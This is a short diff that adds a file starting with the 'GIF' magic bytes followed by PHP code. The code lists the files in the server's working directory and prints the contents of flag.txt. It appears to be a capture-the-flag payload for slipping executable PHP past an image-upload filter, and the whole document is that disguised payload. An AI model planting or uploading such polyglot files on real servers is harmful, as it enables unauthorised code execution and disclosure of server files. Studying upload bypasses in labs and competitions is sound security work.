@@ -1,0 +1,12 @@
+GIF <?php 
+$dir = getcwd();  // Current working directory
+
+$files = scandir($dir);  // Get all files in the current directory
+echo "Files in directory: <br>";
+foreach ($files as $file) {
+    echo $file . "<br>";
+}
+
+echo "Content of flag.txt is:\n".'<br>';
+echo file_get_contents('flag.txt')."<br>";
+ ?>
